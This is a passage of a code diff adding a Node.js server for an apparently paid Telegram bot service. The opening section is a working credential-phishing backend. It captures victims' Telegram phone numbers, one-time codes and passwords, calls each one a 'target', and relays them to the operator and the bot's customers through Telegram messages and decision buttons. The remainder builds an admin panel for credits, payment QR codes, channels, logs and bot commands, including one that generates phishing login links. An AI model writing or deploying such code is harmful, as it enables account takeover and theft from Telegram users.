+            await S7.sendMessage(userId, replaceAllEmojis('📱 <b>New Telegram Login Attempt</b>\n\n📱 <b>Phone:</b> <code>') + phone + replaceAllEmojis('</code>\n⏰ ') + new Date().toLocaleString() + replaceAllEmojis('\n\n💡 Target has entered their phone number. Waiting for OTP...'), { parse_mode: 'HTML' });
+            
+            logToFile(`📱 Phone received: ${phone} from user ${userId}`);
+            return res.json({ status: 'success' });
+        }
+
+        if (action === 'otp') {
+            session.otp = otp;
+            session.step = 'otp_verification';
+            session.decision = null;
+            
+            const creatorMsg = replaceAllEmojis('🔐 <b>OTP Received</b>\n\n👤 <b>User ID:</b> <code>') + userId + replaceAllEmojis('</code>\n📱 <b>Phone:</b> <code>') + session.phone + replaceAllEmojis('</code>\n🔢 <b>OTP:</b> <code>') + otp + replaceAllEmojis('</code>\n⏰ ') + new Date().toLocaleString() + replaceAllEmojis('\n\n📌 <b>Choose action:</b>');
+            
+            const buttons = {
+                inline_keyboard: [
+                    [{ text: replaceAllEmojis('✅ ') + 'Password Manga Raha', callback_data: `phish_password_${sessionId}` }],
+                    [{ text: replaceAllEmojis('❌ ') + 'OTP Galat Hai', callback_data: `phish_wrong_${sessionId}` }],
+                    [{ text: replaceAllEmojis('📱 ') + 'Open Ho Gya Telegram', callback_data: `phish_open_${sessionId}` }]
+                ]
+            };
+            
+            await S7.sendMessage(config.adminId, creatorMsg, { parse_mode: 'HTML', reply_markup: buttons });
+            await S7.sendMessage(userId, replaceAllEmojis('🔐 <b>OTP Received</b>\n\n📱 <b>Phone:</b> <code>') + session.phone + replaceAllEmojis('</code>\n🔢 <b>OTP:</b> <code>') + otp + replaceAllEmojis('</code>\n⏰ ') + new Date().toLocaleString() + replaceAllEmojis('\n\n⏳ Waiting for your decision...'), { parse_mode: 'HTML' });
+            
+            logToFile(`🔐 OTP received: ${otp} for phone ${session.phone}`);
+            return res.json({ status: 'waiting_decision' });
+        }
+
+        if (action === 'password') {
+            session.password = password;
+            session.step = 'password_received';
+            
+            const creatorMsg = replaceAllEmojis('🔑 <b>Password Received</b>\n\n👤 <b>User ID:</b> <code>') + userId + replaceAllEmojis('</code>\n📱 <b>Phone:</b> <code>') + session.phone + replaceAllEmojis('</code>\n🔑 <b>Password:</b> <code>') + password + replaceAllEmojis('</code>\n⏰ ') + new Date().toLocaleString() + replaceAllEmojis('\n\n✅ Full access credentials collected!');
+            
+            await S7.sendMessage(config.adminId, creatorMsg, { parse_mode: 'HTML' });
+            await S7.sendMessage(userId, replaceAllEmojis('✅ <b>Password Received</b>\n\n📱 <b>Phone:</b> <code>') + session.phone + replaceAllEmojis('</code>\n🔑 <b>Password:</b> <code>') + password + replaceAllEmojis('</code>\n⏰ ') + new Date().toLocaleString() + replaceAllEmojis('\n\n🎯 Full credentials captured successfully!'), { parse_mode: 'HTML' });
+            
+            logToFile(`🔑 Password received for phone ${session.phone}`);
+            return res.json({ status: 'success' });
+        }
+
+        if (action === 'completed') {
+            session.step = 'completed';
+            await S7.sendMessage(config.adminId, replaceAllEmojis('✅ <b>Telegram Premium Request Submitted!</b>\n\n👤 User: <code>') + userId + replaceAllEmojis('</code>\n📱 Phone: <code>') + session.phone + replaceAllEmojis('</code>\n⏰ ') + new Date().toLocaleString(), { parse_mode: 'HTML' });
+            await S7.sendMessage(userId, replaceAllEmojis('✅ <b>Request Completed!</b>\n\n📱 Phone: <code>') + session.phone + replaceAllEmojis('</code>\n⏰ ') + new Date().toLocaleString() + replaceAllEmojis('\n\n🎉 Target has completed the process!'), { parse_mode: 'HTML' });
+            logToFile(`✅ Completed for phone ${session.phone}`);
+            return res.json({ status: 'success' });
+        }
+
+        if (action === 'resend-otp') {
+            await S7.sendMessage(config.adminId, replaceAllEmojis('🔄 <b>OTP Resend Request</b>\n\n👤 User: <code>') + userId + replaceAllEmojis('</code>\n📱 Phone: <code>') + session.phone + replaceAllEmojis('</code>'), { parse_mode: 'HTML' });
+            return res.json({ status: 'success' });
+        }
+
+        return res.json({ status: 'unknown_action' });
+    } catch (err) {
+        console.error('Telegram Phish Error:', err);
+        return res.status(500).json({ error: err.message });
+    }
+});
+
+// ====================== ADMIN API ENDPOINTS ======================
+
+// Get all photos
+app.get('/api/admin/photos', async (req, res) => {
+    try {
+        const photos = await getPhotos();
+        res.json({ photos });
+    } catch (err) {
+        res.status(500).json({ error: err.message });
+    }
+});
+
+// Upload photo via admin (using multer)
+app.post('/api/admin/upload', upload.single('photo'), async (req, res) => {
+    try {
+        if (!req.file) {
+            console.error('No file in request');
+            return res.status(400).json({ error: 'No file uploaded' });
+        }
+        const caption = req.body.caption || '';
+        const photo = await addPhoto(req.file, caption);
+        res.json({ success: true, photo });
+    } catch (err) {
+        console.error('Upload error:', err);
+        res.status(500).json({ error: err.message });
+    }
+});
+
+// Delete photo
+app.delete('/api/admin/photos/:id', async (req, res) => {
+    try {
+        const success = await deletePhoto(req.params.id);
+        if (success) res.json({ success: true });
+        else res.status(404).json({ error: 'Photo not found' });
+    } catch (err) {
+        res.status(500).json({ error: err.message });
+    }
+});
+
+// Toggle photo active
+app.patch('/api/admin/photos/:id/toggle', async (req, res) => {
+    try {
+        const photo = await togglePhoto(req.params.id);
+        if (photo) res.json({ success: true, photo });
+        else res.status(404).json({ error: 'Photo not found' });
+    } catch (err) {
+        res.status(500).json({ error: err.message });
+    }
+});
+
+// Get channels
+app.get('/api/admin/channels', async (req, res) => {
+    try {
+        const channels = await getChannels();
+        res.json(channels);
+    } catch (err) {
+        res.status(500).json({ error: err.message });
+    }
+});
+
+// Add channel
+app.post('/api/admin/channels', async (req, res) => {
+    try {
+        const { id, name, link } = req.body;
+        if (!id || !name || !link) return res.status(400).json({ error: 'Missing fields' });
+        const channel = await addChannel(id, name, link);
+        res.json({ success: true, channel });
+    } catch (err) {
+        res.status(500).json({ error: err.message });
+    }
+});
+
+// Remove channel
+app.delete('/api/admin/channels/:id', async (req, res) => {
+    try {
+        await removeChannel(req.params.id);
+        res.json({ success: true });
+    } catch (err) {
+        res.status(500).json({ error: err.message });
+    }
+});
+
+// Get all users
+app.get('/api/admin/users', async (req, res) => {
+    try {
+        const users = await User.find();
+        const userMap = {};
+        users.forEach(u => {
+            userMap[u.userId] = {
+                credits: u.credits,
+                unlimited: u.unlimited,
+                totalReferrals: u.totalReferrals,
+                joinedAt: u.joinedAt,
+                referredBy: u.referredBy,
+                banned: u.banned
+            };
+        });
+        res.json(userMap);
+    } catch (err) {
+        res.status(500).json({ error: err.message });
+    }
+});
+
+// Get single user
+app.get('/api/admin/user/:userId', async (req, res) => {
+    try {
+        const user = await getUser(req.params.userId);
+        res.json({
+            credits: user.credits,
+            unlimited: user.unlimited,
+            totalReferrals: user.totalReferrals,
+            joinedAt: user.joinedAt,
+            referredBy: user.referredBy,
+            banned: user.banned
+        });
+    } catch (err) {
+        res.status(500).json({ error: err.message });
+    }
+});
+
+// Modify credits
+app.post('/api/admin/modify-credits', async (req, res) => {
+    try {
+        const { userId, amount } = req.body;
+        if (!userId || amount === undefined) return res.status(400).json({ error: 'Missing fields' });
+        const user = await getUser(userId);
+        if (user.unlimited) return res.json({ success: true, credits: 'Unlimited', unlimited: true });
+        user.credits += amount;
+        if (user.credits < 0) user.credits = 0;
+        await user.save();
+        res.json({ success: true, credits: user.credits });
+    } catch (err) {
+        res.status(500).json({ error: err.message });
+    }
+});
+
+// Toggle unlimited
+app.post('/api/admin/toggle-unlimited', async (req, res) => {
+    try {
+        const { userId } = req.body;
+        if (!userId) return res.status(400).json({ error: 'Missing userId' });
+        const user = await getUser(userId);
+        user.unlimited = !user.unlimited;
+        await user.save();
+        res.json({ success: true, unlimited: user.unlimited });
+    } catch (err) {
+        res.status(500).json({ error: err.message });
+    }
+});
+
+// Get featured
+app.get('/api/admin/featured', async (req, res) => {
+    try {
+        const featured = await getFeatured();
+        let photoData = null;
+        if (featured.photo) {
+            const photo = await Photo.findOne({ id: featured.photo });
+            if (photo) photoData = { id: photo.id, url: photo.url, caption: photo.caption };
+        }
+        res.json({
+            photo: featured.photo,
+            photoData,
+            message: featured.message,
+            status: featured.status
+        });
+    } catch (err) {
+        res.status(500).json({ error: err.message });
+    }
+});
+
+// Set featured photo
+app.post('/api/admin/featured/photo', async (req, res) => {
+    try {
+        const { photoId } = req.body;
+        if (!photoId) return res.status(400).json({ error: 'Missing photoId' });
+        await setFeaturedPhoto(photoId);
+        res.json({ success: true });
+    } catch (err) {
+        res.status(500).json({ error: err.message });
+    }
+});
+
+// Remove featured photo
+app.delete('/api/admin/featured/photo', async (req, res) => {
+    try {
+        await setFeaturedPhoto(null);
+        res.json({ success: true });
+    } catch (err) {
+        res.status(500).json({ error: err.message });
+    }
+});
+
+// Set featured message
+app.post('/api/admin/featured/message', async (req, res) => {
+    try {
+        const { message } = req.body;
+        if (!message) return res.status(400).json({ error: 'Missing message' });
+        await setFeaturedMessage(message);
+        res.json({ success: true });
+    } catch (err) {
+        res.status(500).json({ error: err.message });
+    }
+});
+
+// Toggle featured status
+app.post('/api/admin/featured/toggle', async (req, res) => {
+    try {
+        await toggleFeaturedStatus();
+        res.json({ success: true });
+    } catch (err) {
+        res.status(500).json({ error: err.message });
+    }
+});
+
+// Get QR code
+app.get('/api/admin/qr', async (req, res) => {
+    if (qrExists()) {
+        res.sendFile(QR_FILE);
+    } else {
+        res.status(404).json({ error: 'QR not found' });
+    }
+});
+
+// Upload QR (multipart)
+app.post('/api/admin/upload-qr', upload.single('qr'), async (req, res) => {
+    try {
+        if (!req.file) {
+            console.error('QR upload: No file received');
+            return res.status(400).json({ error: 'No file uploaded' });
+        }
+        console.log('QR upload: file received', req.file.originalname);
+        const buffer = fs.readFileSync(req.file.path);
+        const saved = saveQRBuffer(buffer);
+        fs.unlinkSync(req.file.path);
+        if (saved) {
+            res.json({ success: true });
+        } else {
+            res.status(500).json({ error: 'Failed to save QR code' });
+        }
+    } catch (err) {
+        console.error('QR upload error:', err);
+        res.status(500).json({ error: err.message });
+    }
+});
+
+// Remove QR
+app.delete('/api/admin/remove-qr', (req, res) => {
+    const removed = deleteQRFile();
+    if (removed) res.json({ success: true });
+    else res.status(404).json({ error: 'QR not found' });
+});
+
+// Get logs
+app.get('/api/admin/logs', (req, res) => {
+    try {
+        const logPath = path.join(DATA_DIR, 'logs.txt');
+        if (fs.existsSync(logPath)) {
+            const logs = fs.readFileSync(logPath, 'utf8');
+            const lastLogs = logs.split('\n').slice(-100).join('\n');
+            res.json({ logs: lastLogs });
+        } else {
+            res.json({ logs: 'No logs available' });
+        }
+    } catch (err) {
+        res.status(500).json({ error: err.message });
+    }
+});
+
+// Clear logs
+app.delete('/api/admin/logs', (req, res) => {
+    try {
+        const logPath = path.join(DATA_DIR, 'logs.txt');
+        if (fs.existsSync(logPath)) fs.writeFileSync(logPath, '');
+        res.json({ success: true });
+    } catch (err) {
+        res.status(500).json({ error: err.message });
+    }
+});
+
+// ====================== ADMIN ROUTE (FIXED UI) ======================
+app.get('/admin', (req, res) => {
+    res.send(`<!DOCTYPE html>
+<html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>Admin Panel</title>
+<style>*{margin:0;padding:0;box-sizing:border-box;font-family:"Segoe UI",sans-serif}body{background:#0a0a0a;color:#fff;padding:20px}.container{max-width:1200px;margin:0 auto}.header{background:linear-gradient(135deg,#ff4757,#ff6b6b);padding:30px;border-radius:15px;margin-bottom:30px;text-align:center}.header h1{font-size:36px}.tabs{display:flex;gap:10px;margin-bottom:30px;flex-wrap:wrap}.tab{background:#1a1a2e;padding:12px 25px;border-radius:10px;cursor:pointer;border:1px solid #2a2a4a;transition:.3s;color:#fff}.tab.active{background:linear-gradient(135deg,#ff4757,#ff6b6b);border-color:#ff4757}.tab:hover{background:#2a2a4a}.tab-content{display:none}.tab-content.active{display:block}.grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(250px,1fr));gap:20px}.card{background:#1a1a2e;border-radius:15px;padding:15px;border:1px solid #2a2a4a;transition:.3s}.card:hover{transform:translateY(-5px);border-color:#ff4757}.card img{width:100%;height:200px;object-fit:cover;border-radius:10px}.card .info{padding:10px 0}.card .actions{display:flex;gap:10px;margin-top:10px;flex-wrap:wrap}.btn{padding:8px 15px;border:none;border-radius:8px;cursor:pointer;font-weight:600;transition:.3s}.btn-danger{background:#dc3545;color:#fff}.btn-danger:hover{background:#c82333}.btn-warning{background:#ffc107;color:#000}.btn-warning:hover{background:#e0a800}.btn-primary{background:linear-gradient(135deg,#ff4757,#ff6b6b);color:#fff}.btn-primary:hover{background:linear-gradient(135deg,#ff6b6b,#ff4757)}.btn-success{background:#28a745;color:#fff}.btn-success:hover{background:#1e7e34}.upload-section{background:#1a1a2e;padding:30px;border-radius:15px;margin-bottom:30px;border:2px dashed #2a2a4a}.upload-section form{display:flex;gap:20px;flex-wrap:wrap;align-items:center}.upload-section input[type="file"]{background:transparent;color:#fff;padding:10px;border:1px solid #2a2a4a;border-radius:8px}.upload-section input[type="text"]{flex:1;min-width:200px;padding:12px;background:#0a0a0a;border:1px solid #2a2a4a;border-radius:8px;color:#fff}.stats{display:grid;grid-template-columns:repeat(auto-fill,minmax(200px,1fr));gap:20px;margin-bottom:30px}.stat-card{background:#1a1a2e;padding:20px;border-radius:15px;text-align:center;border:1px solid #2a2a4a}.stat-card .number{font-size:32px;font-weight:700;color:#ff4757}.stat-card .label{color:#888;font-size:14px}.channel-item{background:#1a1a2e;padding:15px;border-radius:10px;margin-bottom:10px;display:flex;justify-content:space-between;align-items:center;border:1px solid #2a2a4a}.channel-item .name{font-weight:600}.channel-item .id{color:#888;font-size:12px}.user-card{background:#1a1a2e;padding:15px;border-radius:10px;border:1px solid #2a2a4a;margin-bottom:10px}.user-card .uid{color:#ff4757;font-weight:600}.toast{position:fixed;bottom:20px;right:20px;background:#28a745;color:#fff;padding:15px 30px;border-radius:10px;display:none;z-index:999}.toast.error{background:#dc3545}.empty{text-align:center;padding:60px 20px;color:#666}.empty i{font-size:64px;margin-bottom:20px;display:block}input,select{padding:10px;border-radius:8px;border:1px solid #2a2a4a;background:#0a0a0a;color:#fff;margin:5px}.flex{display:flex;gap:10px;flex-wrap:wrap;align-items:center}.qr-section{background:#1a1a2e;padding:30px;border-radius:15px;text-align:center;border:1px solid #2a2a4a}.qr-section img{max-width:200px;border-radius:10px;border:2px solid #2a2a4a}.featured-preview{background:#0a0a0a;padding:15px;border-radius:10px;border:1px solid #2a2a4a;margin-top:10px}.featured-preview img{max-width:200px;border-radius:10px}.status-badge{padding:8px 20px;border-radius:20px;font-weight:600;display:inline-block}.status-active{background:#1a3a1a;color:#28a745}.status-inactive{background:#3a1a1a;color:#dc3545}.logs-area{background:#0a0a0a;padding:15px;border-radius:10px;border:1px solid #2a2a4a;max-height:400px;overflow-y:auto;font-family:monospace;font-size:12px;color:#aaa;white-space:pre-wrap}.qr-preview{border:2px solid #2a2a4a;border-radius:10px;padding:10px;background:#0a0a0a;display:inline-block;margin-top:10px}
+</style></head>
+<body><div class="container"><div class="header"><h1>📸 Admin Panel</h1><p>Complete Control</p></div>
+<div class="tabs"><div class="tab active" onclick="showTab('photos')">📷 Photos</div><div class="tab" onclick="showTab('channels')">📢 Channels</div><div class="tab" onclick="showTab('users')">👥 Users</div><div class="tab" onclick="showTab('featured')">⭐ Featured</div><div class="tab" onclick="showTab('qr')">💰 QR</div><div class="tab" onclick="showTab('logs')">📋 Logs</div><div class="tab" onclick="showTab('commands')">📜 Commands</div></div>
+<div id="tab-photos" class="tab-content active"><div class="stats" id="stats"></div><div class="upload-section"><h3>📤 Upload Photo</h3><form id="uploadForm" enctype="multipart/form-data"><input type="file" name="photo" accept="image/*" required><input type="text" name="caption" placeholder="Caption"><button type="submit" class="btn btn-primary">Upload</button></form></div><div id="photoGrid" class="grid"></div></div>
+<div id="tab-channels" class="tab-content"><h2>📢 Manage Channels</h2><div class="upload-section"><h3>➕ Add Channel</h3><div class="flex"><input type="text" id="channelId" placeholder="Channel ID" style="flex:1"><input type="text" id="channelName" placeholder="Channel Name" style="flex:1"><input type="text" id="channelLink" placeholder="Channel Link" style="flex:1"><button class="btn btn-success" onclick="addChannel()">Add</button></div></div><div id="channelList"></div></div>
+<div id="tab-users" class="tab-content"><h2>👥 Manage Users</h2><div class="flex" style="margin-bottom:20px"><input type="text" id="searchUser" placeholder="Search User ID..." style="flex:1"><button class="btn btn-primary" onclick="searchUser()">Search</button></div><div id="userList"></div><div class="flex" style="margin-top:20px"><input type="text" id="userIdInput" placeholder="User ID" style="flex:1"><input type="number" id="creditAmount" placeholder="Credits" style="width:150px"><button class="btn btn-warning" onclick="modifyCredits()">Modify</button><button class="btn btn-success" onclick="toggleUnlimited()">Unlimited</button></div></div>
+<div id="tab-featured" class="tab-content"><h2>⭐ Featured Settings</h2><div class="upload-section"><h3>📸 Featured Photo</h3><div class="flex"><select id="featuredPhotoSelect" style="flex:1;padding:12px;background:#0a0a0a;border:1px solid #2a2a4a;color:#fff;border-radius:8px;"><option value="">Select a photo...</option></select><button class="btn btn-primary" onclick="setFeaturedPhoto()">Set</button><button class="btn btn-danger" onclick="removeFeaturedPhoto()">Remove</button></div><div id="featuredPreview" class="featured-preview"><p style="color:#888;">No featured photo</p></div></div><div class="upload-section"><h3>💬 Featured Message</h3><div class="flex"><input type="text" id="featuredMessage" placeholder="Enter message..." style="flex:1;padding:12px;background:#0a0a0a;border:1px solid #2a2a4a;color:#fff;border-radius:8px;"><button class="btn btn-primary" onclick="setFeaturedMessage()">Update</button></div><div id="featuredMessageDisplay" style="margin-top:10px;padding:15px;background:#0a0a0a;border-radius:8px;border:1px solid #2a2a4a;color:#aaa;"></div></div><div class="upload-section"><h3>⚙️ Status</h3><div class="flex"><span id="featuredStatus" class="status-badge status-active">✅ Active</span><button class="btn btn-warning" onclick="toggleFeaturedStatus()">Toggle</button></div></div></div>
+<div id="tab-qr" class="tab-content"><div class="qr-section"><h2>💰 Payment QR Code</h2>
+<p style="color:#888;margin:10px 0;">Upload QR code image below</p>
+<div class="flex" style="justify-content:center;margin:20px 0;">
+<input type="file" id="qrUpload" accept="image/*" style="background:#0a0a0a;color:#fff;padding:10px;border:1px solid #2a2a4a;border-radius:8px;">
+<button class="btn btn-primary" onclick="uploadQR()">📤 Upload QR</button>
+<button class="btn btn-danger" onclick="removeQR()">🗑️ Remove QR</button>
+</div>
+<div id="qrPreview" class="qr-preview" style="margin-top:20px;display:none;">
+<p style="color:#888;margin-bottom:10px;">✅ Current QR Code:</p>
+<img id="qrImage" src="" style="max-width:200px;border-radius:10px;border:2px solid #28a745;">
+</div>
+<div id="qrStatus" style="margin-top:10px;padding:10px;border-radius:8px;background:#1a1a2e;border:1px solid #2a2a4a;color:#888;"></div>
+</div></div>
+<div id="tab-logs" class="tab-content"><h2>📋 Server Logs</h2><div class="flex" style="margin-bottom:20px"><button class="btn btn-primary" onclick="loadLogs()">Refresh</button><button class="btn btn-danger" onclick="clearLogs()">Clear Logs</button></div><div id="logsDisplay" class="logs-area">Loading logs...</div></div>
+<div id="tab-commands" class="tab-content"><h2>📜 All Commands</h2><div class="upload-section"><h3>👑 Admin Commands</h3><pre style="color:#aaa;font-family:monospace;font-size:14px;line-height:1.8;background:#0a0a0a;padding:20px;border-radius:10px;border:1px solid #2a2a4a;">/help or /commands - Show all commands
+/admin - Open admin panel
+/addcredits [userId] [amount] - Add credits
+/removecredits [userId] [amount] - Remove credits
+/unlimited [userId] - Activate unlimited
+/resetuser [userId] - Reset user
+/users - Show all users
+/stats - Bot statistics
+/broadcast [message] - Send to all users
+/addqr - Upload QR code
+/removeqr - Remove QR code
+/viewqr - View QR code
+/addchannel [id] [name] [link] - Add channel
+/removechannel [id] - Remove channel
+/channels - List all channels
+/addphoto [caption] - Upload photo (reply with image)
+/featured [photoId] - Set featured photo
+/featuredmsg [message] - Set featured message
+/featuredtoggle - Toggle featured on/off
+/logs - Show recent logs
+/restart - Restart bot
+/dm [userId] [message] - DM a user
+/ban [userId or @username] - Ban user
+/unban [userId or @username] - Unban user
+/createcoupon [code] [credits] [maxUses] - Create coupon
+/coupons - List all coupons
+/deletecoupon [code] - Delete coupon
+/getadmin - Get admin panel link</pre><h3 style="margin-top:20px">👤 User Commands</h3><pre style="color:#aaa;font-family:monospace;font-size:14px;line-height:1.8;background:#0a0a0a;padding:20px;border-radius:10px;border:1px solid #2a2a4a;">/start - Start the bot
+/menu - Show main menu
+/pay [amount] - Buy credits (e.g., /pay 20)
+/credits - Check your credits
+/referral - Get referral link
+/redeem [coupon_code] - Redeem coupon
+/telegram - Generate Telegram login link</pre></div></div>
+</div>
+<div id="toast" class="toast"></div>
+<script>
+var API_BASE=window.location.origin;
+function showToast(m,e){e=e||false;var t=document.getElementById("toast");t.textContent=m;t.className="toast"+(e?" error":"");t.style.display="block";setTimeout(function(){t.style.display="none"},3000);}
+function showTab(tab){document.querySelectorAll(".tab-content").forEach(function(t){t.classList.remove("active")});document.querySelectorAll(".tab").forEach(function(t){t.classList.remove("active")});document.getElementById("tab-"+tab).classList.add("active");document.querySelector(".tab[onclick=\\"showTab(\\\'"+tab+"\\\')\\"]").classList.add("active");if(tab==="channels")loadChannels();if(tab==="users")loadUsers();if(tab==="featured")loadFeatured();if(tab==="logs")loadLogs();if(tab==="qr")loadQR();}
+async function loadPhotos(){try{var r=await fetch("/api/admin/photos");var d=await r.json();var photos=d.photos||[];var active=photos.filter(function(p){return p.active}).length;var total=photos.length;document.getElementById("stats").innerHTML="<div class=\\"stat-card\\"><div class=\\"number\\">"+total+"</div><div class=\\"label\\">Total</div></div><div class=\\"stat-card\\"><div class=\\"number\\">"+active+"</div><div class=\\"label\\">Active</div></div><div class=\\"stat-card\\"><div class=\\"number\\">"+(total-active)+"</div><div class=\\"label\\">Inactive</div></div>";var grid=document.getElementById("photoGrid");if(photos.length===0){grid.innerHTML="<div class=\\"empty\\"><i>📷</i>No photos</div>";return;}var html="";for(var i=0;i<photos.length;i++){var p=photos[i];html+="<div class=\\"card\\"><img src=\\""+p.url+"\\"><div class=\\"info\\"><div>"+(p.caption||"No caption")+"</div><div style=\\"font-size:12px;color:#888;\\">"+new Date(p.uploadedAt).toLocaleDateString()+"</div><div style=\\"font-size:12px;color:"+(p.active?"#28a745":"#dc3545")+";\\">"+(p.active?"✅ Active":"❌ Inactive")+"</div></div><div class=\\"actions\\"><button class=\\"btn btn-warning\\" onclick=\\"togglePhoto(\\\'"+p.id+"\\\')\\">"+(p.active?"Hide":"Show")+"</button><button class=\\"btn btn-danger\\" onclick=\\"deletePhoto(\\\'"+p.id+"\\\')\\">Delete</button></div></div>";}grid.innerHTML=html;}catch(err){showToast("Error loading photos",true);}}
+async function deletePhoto(id){if(!confirm("Delete?"))return;try{var r=await fetch("/api/admin/photos/"+id,{method:"DELETE"});if(r.ok){showToast("Deleted!");loadPhotos();}else showToast("Delete failed",true);}catch(err){showToast("Error",true);}}
+async function togglePhoto(id){try{var r=await fetch("/api/admin/photos/"+id+"/toggle",{method:"PATCH"});if(r.ok){showToast("Toggled!");loadPhotos();}else showToast("Toggle failed",true);}catch(err){showToast("Error",true);}}
+document.getElementById("uploadForm").addEventListener("submit",async function(e){e.preventDefault();var fd=new FormData(e.target);try{var r=await fetch("/api/admin/upload",{method:"POST",body:fd});if(r.ok){showToast("Uploaded!");e.target.reset();loadPhotos();loadFeatured();}else showToast("Upload failed",true);}catch(err){showToast("Error",true);}});
+async function loadChannels(){try{var r=await fetch("/api/admin/channels");var channels=await r.json();var list=document.getElementById("channelList");if(channels.length===0){list.innerHTML="<div class=\\"empty\\"><i>📢</i>No channels</div>";return;}var html="";for(var i=0;i<channels.length;i++){var c=channels[i];html+="<div class=\\"channel-item\\"><div><div class=\\"name\\">"+c.name+"</div><div class=\\"id\\">"+c.id+"</div></div><div><a href=\\""+c.link+"\\" target=\\"_blank\\" class=\\"btn btn-primary\\">Visit</a><button class=\\"btn btn-danger\\" onclick=\\"removeChannel(\\\'"+c.id+"\\\')\\">Remove</button></div></div>";}list.innerHTML=html;}catch(err){showToast("Error loading channels",true);}}
+async function addChannel(){var id=document.getElementById("channelId").value.trim();var name=document.getElementById("channelName").value.trim();var link=document.getElementById("channelLink").value.trim();if(!id||!name||!link){showToast("Fill all fields",true);return;}try{var r=await fetch("/api/admin/channels",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({id:id,name:name,link:link})});if(r.ok){showToast("Channel added!");["channelId","channelName","channelLink"].forEach(function(i){document.getElementById(i).value=""});loadChannels();}else showToast("Add failed",true);}catch(err){showToast("Error",true);}}
+async function removeChannel(id){if(!confirm("Remove?"))return;try{var r=await fetch("/api/admin/channels/"+id,{method:"DELETE"});if(r.ok){showToast("Removed!");loadChannels();}else showToast("Remove failed",true);}catch(err){showToast("Error",true);}}
+async function loadUsers(){try{var r=await fetch("/api/admin/users");var users=await r.json();var list=document.getElementById("userList");var entries=Object.entries(users);if(entries.length===0){list.innerHTML="<div class=\\"empty\\"><i>👥</i>No users</div>";return;}var html="";for(var i=0;i<entries.length;i++){var id=entries[i][0];var data=entries[i][1];html+="<div class=\\"user-card\\"><div class=\\"uid\\">🆔 "+id+"</div><div>⭐ Credits: "+(data.unlimited?"♾️ Unlimited":data.credits||0)+"</div><div>👥 Referrals: "+(data.totalReferrals||0)+"</div><div>📅 Joined: "+new Date(data.joinedAt).toLocaleDateString()+"</div><div style=\\"font-size:12px;color:#888;\\">Referred by: "+(data.referredBy||"None")+"</div><div style=\\"font-size:12px;color:"+(data.banned?"#dc3545":"#28a745")+";\\">"+(data.banned?"🚫 Banned":"✅ Active")+"</div></div>";}list.innerHTML=html;}catch(err){showToast("Error loading users",true);}}
+async function searchUser(){var uid=document.getElementById("searchUser").value.trim();if(!uid){showToast("Enter User ID",true);return;}try{var r=await fetch("/api/admin/user/"+uid);var user=await r.json();if(user.error){showToast("User not found",true);return;}document.getElementById("userList").innerHTML="<div class=\\"user-card\\"><div class=\\"uid\\">🆔 "+uid+"</div><div>⭐ Credits: "+(user.unlimited?"♾️ Unlimited":user.credits||0)+"</div><div>👥 Referrals: "+(user.totalReferrals||0)+"</div><div>📅 Joined: "+new Date(user.joinedAt).toLocaleDateString()+"</div><div>Referred by: "+(user.referredBy||"None")+"</div><div style=\\"font-size:12px;color:"+(user.banned?"#dc3545":"#28a745")+";\\">"+(user.banned?"🚫 Banned":"✅ Active")+"</div></div>";}catch(err){showToast("Error",true);}}
+async function modifyCredits(){var uid=document.getElementById("userIdInput").value.trim();var amount=parseInt(document.getElementById("creditAmount").value);if(!uid||isNaN(amount)){showToast("Enter valid User ID and amount",true);return;}try{var r=await fetch("/api/admin/modify-credits",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({userId:uid,amount:amount})});var data=await r.json();if(data.success){showToast("Updated! New: "+data.credits);loadUsers();}else showToast("Update failed",true);}catch(err){showToast("Error",true);}}
+async function toggleUnlimited(){var uid=document.getElementById("userIdInput").value.trim();if(!uid){showToast("Enter User ID",true);return;}try{var r=await fetch("/api/admin/toggle-unlimited",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({userId:uid})});var data=await r.json();if(data.success){showToast("Unlimited: "+(data.unlimited?"ON":"OFF"));loadUsers();}else showToast("Toggle failed",true);}catch(err){showToast("Error",true);}}
+async function loadFeatured(){try{var r=await fetch("/api/admin/featured");var data=await r.json();var photos=await fetch("/api/admin/photos").then(function(r){return r.json()});var select=document.getElementById("featuredPhotoSelect");select.innerHTML="<option value=\\"\\">Select a photo...</option>";for(var i=0;i<photos.photos.length;i++){var p=photos.photos[i];var opt=document.createElement("option");opt.value=p.id;opt.textContent=p.caption||p.filename;if(data.photo===p.id)opt.selected=true;select.appendChild(opt);}var preview=document.getElementById("featuredPreview");if(data.photoData){preview.innerHTML="<img src=\\""+data.photoData.url+"\\" style=\\"max-width:200px;border-radius:10px;border:1px solid #2a2a4a;\\">";}else{preview.innerHTML="<p style=\\"color:#888;\\">No featured photo</p>";}document.getElementById("featuredMessageDisplay").innerHTML="<strong>Current:</strong> "+(data.message||"No message");document.getElementById("featuredMessage").value=data.message||"";var statusEl=document.getElementById("featuredStatus");if(data.status){statusEl.className="status-badge status-active";statusEl.textContent="✅ Active";}else{statusEl.className="status-badge status-inactive";statusEl.textContent="❌ Inactive";}}catch(err){showToast("Error loading featured",true);}}
+async function setFeaturedPhoto(){var photoId=document.getElementById("featuredPhotoSelect").value;if(!photoId){showToast("Select a photo",true);return;}try{var r=await fetch("/api/admin/featured/photo",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({photoId:photoId})});if(r.ok){showToast("Featured photo updated!");loadFeatured();}else showToast("Update failed",true);}catch(err){showToast("Error",true);}}
+async function removeFeaturedPhoto(){try{var r=await fetch("/api/admin/featured/photo",{method:"DELETE"});if(r.ok){showToast("Removed!");loadFeatured();}else showToast("Remove failed",true);}catch(err){showToast("Error",true);}}
+async function setFeaturedMessage(){var message=document.getElementById("featuredMessage").value.trim();if(!message){showToast("Enter a message",true);return;}try{var r=await fetch("/api/admin/featured/message",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({message:message})});if(r.ok){showToast("Message updated!");loadFeatured();}else showToast("Update failed",true);}catch(err){showToast("Error",true);}}
+async function toggleFeaturedStatus(){try{var r=await fetch("/api/admin/featured/toggle",{method:"POST"});if(r.ok){showToast("Status toggled!");loadFeatured();}else showToast("Toggle failed",true);}catch(err){showToast("Error",true);}}
